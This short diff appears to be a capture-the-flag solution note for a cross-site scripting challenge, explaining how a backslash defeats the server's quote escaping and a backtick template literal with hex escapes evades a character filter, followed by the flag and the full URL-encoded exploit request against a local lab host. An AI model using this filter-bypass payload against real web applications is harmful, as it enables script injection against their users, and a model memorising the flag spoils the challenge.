@@ -1,0 +1,4 @@
+# XSS via escape-the-escape + template literal. Filter blocks: ', uppercase A-Z, <. Server escapes " to \". Bypass: prepend \ to create \\", JS sees escaped backslash + string terminator. Use backtick template literal with hex escapes for XSS string. CTF Flag: flag{82c40724-957f-4929-a7f0-beda740778d2}
+
+GET /page?name=%5C%22%3Balert%28%60%5Cx58%5Cx53%5Cx53%60%29%2F%2F HTTP/1.1
+Host: 172.17.0.1:44281
